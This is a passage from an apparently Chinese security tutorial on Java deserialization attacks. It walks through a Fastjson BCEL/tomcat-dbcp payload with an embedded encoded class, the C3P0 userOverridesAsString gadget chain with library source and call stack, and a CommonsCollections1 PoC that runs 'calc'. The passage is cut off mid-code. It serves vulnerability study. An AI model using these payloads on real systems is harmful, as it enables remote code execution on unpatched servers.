<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro.vuln.fastjson;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson03_Becl</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//&lt;=1.2.24 and tomcat-dbcp 7</span></span><br><span class="line"><span class="comment">//		InputStream resourceAsStream = Fastjson03_Becl.class.getResourceAsStream(&quot;Calc.class&quot;);</span></span><br><span class="line"><span class="comment">//		byte[] bs = new byte[resourceAsStream.available()];</span></span><br><span class="line"><span class="comment">//		resourceAsStream.read(bs);</span></span><br><span class="line"><span class="comment">//		String code = &quot;$$BCEL$$&quot;+Utility.encode(bs,true);</span></span><br><span class="line"></span><br><span class="line">		<span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\tmp\\T.class&quot;</span>));</span><br><span class="line">		<span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span>  <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(bytes, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;    &#123;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;    \&quot;aaa\&quot;: &#123;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;            \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;, \r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;            \&quot;driverClassLoader\&quot;: &#123;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;                \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;            &#125;, \r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;            \&quot;driverClassName\&quot;: \&quot;&quot;</span>+code+<span class="string">&quot;\&quot;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;        &#125;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;    &#125;:\&quot;bbb\&quot;\r\n&quot;</span></span><br><span class="line">        		+ <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>payload</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$c1N$C1$Q$7d$F$d9$b2$x$I$82$m$a2$a8$e8A$f0$A$Xo$Q$_F$T$p$8a$91$N$c6$e3R$h$5c$c4$5d$b2$y$ca$ly$e6$a2F$T$bd$fbQ$c6$e9$c6$m$J$3dt$3ao$de$7b$9dN$bf$7f$de$3f$B$i$60$d7$80$8e$b4$81$Vd$a2$c8$aa$b8$ca$91$e3X3$a0$n$cf$b1$ce$b1$c1$a0$d5m$c7$f6$P$Z$c2$a5r$9ba$e1$c8$bd$95$M$89$86$ed$c8$8b$d1CGz$a6$d5$e9$T$S$ad$8b$fe$l3$de$f2$zq$7fn$N$82$Sy2$Y$zw$e4$Jyb$x$aafVz$d6$a3$V$83$81E$8eB$M$9b$d8$o$Da$f5EE$8ee$M$db$u2$a4$V$a7j$bb$d5$d3$e6$f1X$c8$81o$bb$OC$3e$40$fb$96$d3$ad$5e$8d$i$df$7e$90$d3$a2$f2$dba$60$sC$f2$9f$d5$ec$f4$a4$f0$Z$96$e7$84$d4UW$fa$d3$qS$w7$e685z1$b5$q$Y$f6J3$d5$96$ef$d9N$b76$x$b8$f4$5c$n$87C$S$e4f$99$e6$9d$e7$3e$a91$d4$cam$U$R$a5$91$ab$V$CS$af$a7$3dFY$81$o$a3$Y$d9$7f$F$9b$d0$81fH$bb$W$80a$S$zM$a9$s$e5$K$5d$7dC$u$V$7e$c1$c2$f53$e2g$l$d0nH$cb$bf$sAQ$tj$84$eeP$sY$3a$v$x$3d$409a$f4$d9tw$82P$8eP$83$p$a9$93h9h$w$f5$LT$ffu$95$j$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;bbb&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-4-流程"><a href="#2-3-4-流程" class="headerlink" title="2.3.4.流程"></a>2.3.4.流程</h3><ol>
<li>首先通过@type指定执行需要反序列化的类，然后分别配置driverClassLoader和driverClassName值。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250324152729482.png?x-oss-process=style/img-to-webp" alt="image-20250324152729482"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250324152900390.png?x-oss-process=style/img-to-webp" alt="image-20250324152900390"></p>
<ol start="2">
<li>然后在getConnection中调用createDataSource()方法，再调用createConnectionFactory方法，实现BCEL的类加载。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250324153123168.png?x-oss-process=style/img-to-webp" alt="image-20250324153123168"></p>
<h2 id="2-4-C3P0-不出网利用"><a href="#2-4-C3P0-不出网利用" class="headerlink" title="2.4.C3P0 (不出网利用)"></a>2.4.C3P0 (不出网利用)</h2><h3 id="2-4-1-利用条件"><a href="#2-4-1-利用条件" class="headerlink" title="2.4.1.利用条件"></a>2.4.1.利用条件</h3><ul>
<li>c3p0要求版本不高于0.9.5.2，且系统存在可利用的反序列化攻击链。</li>
</ul>
<h3 id="2-4-1-流程分析"><a href="#2-4-1-流程分析" class="headerlink" title="2.4.1. 流程分析"></a>2.4.1. 流程分析</h3><ul>
<li><p>C3P0的利用链很简单，虽然说发现这条链的人或者团队肯定耗费了大量时间，但是其实利用起来很简单只需要调用一个方法即可。</p>
</li>
<li><p>通过调用com.mchange.v2.c3p0.WrapperConnectionPoolDataSource的setUserOverridesAsString（其实是调用父类抽象类的setUserOverridesAsString方法），同时给唯一参数userOverridesAsString赋值，值为我们要攻击的反序列化对象，任意可用的反序列化链即可，例如CC链，然后将其转换为hex字符串即可。</p>
</li>
<li><p>攻击流程我们大概清楚了，那么我们来分析一下具体的调用细节。</p>
</li>
<li><p>调用父类中的WrapperConnectionPoolDataSourceBase中的问题。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> PropertyVetoException</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="built_in">this</span>.userOverridesAsString;</span><br><span class="line">	<span class="keyword">if</span> ( ! eqOrBothNull( oldVal, userOverridesAsString ) )</span><br><span class="line">		vcs.fireVetoableChange( <span class="string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString );</span><br><span class="line">	<span class="built_in">this</span>.userOverridesAsString = userOverridesAsString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>VetoableChangeSupport</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fireVetoableChange</span><span class="params">(String propertyName, Object oldValue, Object newValue)</span></span><br><span class="line">        <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (oldValue == <span class="literal">null</span> || newValue == <span class="literal">null</span> || !oldValue.equals(newValue)) &#123;</span><br><span class="line">        fireVetoableChange(<span class="keyword">new</span> <span class="title class_">PropertyChangeEvent</span>(<span class="built_in">this</span>.source, propertyName, oldValue, newValue));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fireVetoableChange</span><span class="params">(PropertyChangeEvent event)</span></span><br><span class="line">            <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">oldValue</span> <span class="operator">=</span> event.getOldValue();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">newValue</span> <span class="operator">=</span> event.getNewValue();</span><br><span class="line">        <span class="keyword">if</span> (oldValue == <span class="literal">null</span> || newValue == <span class="literal">null</span> || !oldValue.equals(newValue)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> event.getPropertyName();</span><br><span class="line"></span><br><span class="line">            VetoableChangeListener[] common = <span class="built_in">this</span>.map.get(<span class="literal">null</span>);</span><br><span class="line">            VetoableChangeListener[] named = (name != <span class="literal">null</span>)</span><br><span class="line">                        ? <span class="built_in">this</span>.map.get(name)</span><br><span class="line">                        : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            VetoableChangeListener[] listeners;</span><br><span class="line">            <span class="keyword">if</span> (common == <span class="literal">null</span>) &#123;</span><br><span class="line">                listeners = named;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (named == <span class="literal">null</span>) &#123;</span><br><span class="line">                listeners = common;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                listeners = <span class="keyword">new</span> <span class="title class_">VetoableChangeListener</span>[common.length + named.length];</span><br><span class="line">                System.arraycopy(common, <span class="number">0</span>, listeners, <span class="number">0</span>, common.length);</span><br><span class="line">                System.arraycopy(named, <span class="number">0</span>, listeners, common.length, named.length);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (listeners != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> (current &lt; listeners.length) &#123;</span><br><span class="line">                        listeners[current].vetoableChange(event);<span class="comment">//调用 vetoableChange</span></span><br><span class="line">                        current++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (PropertyVetoException veto) &#123;</span><br><span class="line">                    event = <span class="keyword">new</span> <span class="title class_">PropertyChangeEvent</span>(<span class="built_in">this</span>.source, name, newValue, oldValue);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; current; i++) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            listeners[i].vetoableChange(event);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (PropertyVetoException exception) &#123;</span><br><span class="line">                            <span class="comment">// ignore exceptions that occur during rolling back</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">throw</span> veto; <span class="comment">// rethrow the veto exception</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408164609045.png?x-oss-process=style/img-to-webp" alt="image-20250408164609045"></p>
<ul>
<li>WrapperConnectionPoolDataSource</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vetoableChange</span><span class="params">( PropertyChangeEvent evt )</span> <span class="keyword">throws</span> PropertyVetoException</span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> evt.getPropertyName();</span><br><span class="line">		    <span class="type">Object</span> <span class="variable">val</span> <span class="operator">=</span> evt.getNewValue();</span><br><span class="line"></span><br><span class="line">		    <span class="keyword">if</span> ( <span class="string">&quot;connectionTesterClassName&quot;</span>.equals( propName ) )</span><br><span class="line">			&#123;</span><br><span class="line">			    <span class="keyword">try</span></span><br><span class="line">				&#123; recreateConnectionTester( (String) val ); &#125;</span><br><span class="line">			    <span class="keyword">catch</span> ( Exception e )</span><br><span class="line">				&#123;</span><br><span class="line">				    <span class="comment">//e.printStackTrace();</span></span><br><span class="line">				    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">					logger.log( MLevel.WARNING, <span class="string">&quot;Failed to create ConnectionTester of class &quot;</span> + val, e );</span><br><span class="line">				    </span><br><span class="line">				    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyVetoException</span>(<span class="string">&quot;Could not instantiate connection tester class with name &#x27;&quot;</span> + val + <span class="string">&quot;&#x27;.&quot;</span>, evt);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;userOverridesAsString&quot;</span>.equals( propName ))</span><br><span class="line">			&#123;</span><br><span class="line">			    <span class="keyword">try</span></span><br><span class="line">				&#123; WrapperConnectionPoolDataSource.<span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( (String) val ); &#125;<span class="comment">//调用parseUserOverridesAsString解析传入的字符串</span></span><br><span class="line">			    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">				&#123;</span><br><span class="line">				    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">					logger.log( MLevel.WARNING, <span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + val, e );</span><br><span class="line">				    </span><br><span class="line">				    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyVetoException</span>(<span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + val, evt);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408164923523.png?x-oss-process=style/img-to-webp" alt="image-20250408164923523"></p>
<ul>
<li>调用parseUserOverridesAsString解析传入的字符串</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">		<span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line">		<span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>调用 转换为二进制数据</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line">	<span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">	    <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>调用deserializeFromByteArray，完成最终二次反序列化。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">	<span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>调用堆栈</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deserializeFromByteArray:143, <span class="attribute">SerializableUtils</span> (com.mchange.v2.ser)</span><br><span class="line">fromByteArray:<span class="number">123</span>,SerializableUtils (com,mchange.v2.ser)</span><br><span class="line">    parseUserOverridesAsString:<span class="number">318</span>,C3P0lmplUtils (com.mchange.v2.c3p0.impl)</span><br><span class="line">        vetoableChange:<span class="number">110</span>, WrapperConnectionPoolDataSource<span class="variable">$1</span> (com.mchange.v2.c3p0)</span><br><span class="line">            fireVetoableChange:<span class="number">375</span>, VetoableChangeSupport (java.beans)</span><br><span class="line">                fireVetoableChange:<span class="number">271</span>,VetoableChangeSupport (ava.beans)</span><br><span class="line">                    setUserOverridesAsString:<span class="number">387</span>, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span><br></pre></td></tr></table></figure>



<h3 id="2-4-2-PoC编写"><a href="#2-4-2-PoC编写" class="headerlink" title="2.4.2.PoC编写"></a>2.4.2.PoC编写</h3><ul>
<li><p>首先准备一个调用链，例如CC1，可以手写，或者利用ysoserial直接生成一个。</p>
</li>
<li><p><strong>方式一：手写</strong></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;yyyy&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; tranformeMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; aihc = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihc.newInstance(Target.class,tranformeMap);</span><br><span class="line">        Serializer.serialize(o);<span 